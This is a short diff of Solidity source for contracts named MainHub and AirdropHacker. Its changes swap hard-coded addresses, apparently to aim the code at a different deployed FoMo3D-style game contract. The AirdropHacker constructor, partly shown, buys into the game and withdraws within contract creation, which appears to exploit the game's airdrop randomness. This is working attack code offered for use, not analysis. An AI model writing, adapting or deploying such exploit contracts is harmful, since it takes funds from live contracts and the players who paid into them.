@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MainHub at 0x118d33a273c37c9a36a43a6ef71a7bec014a4d89
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MainHub at 0xafe73707d9e788c21bd9d492ef1af6064fae60be
 */
 pragma solidity ^0.4.24;
 
@@ -21,7 +21,7 @@ contract MainHub{
     using SafeMath for *;
     address public owner;
     bool public closed = false;
-    FoMo3Dlong code = FoMo3Dlong(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);
+    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
     
     modifier onlyOwner{
         require(msg.sender==owner);
@@ -75,7 +75,7 @@ contract MainHub{
 }
 
 contract AirdropHacker{
-    FoMo3Dlong code = FoMo3Dlong(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);
+    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
     constructor() public payable{
         code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2);//just a random address
         code.withdraw();
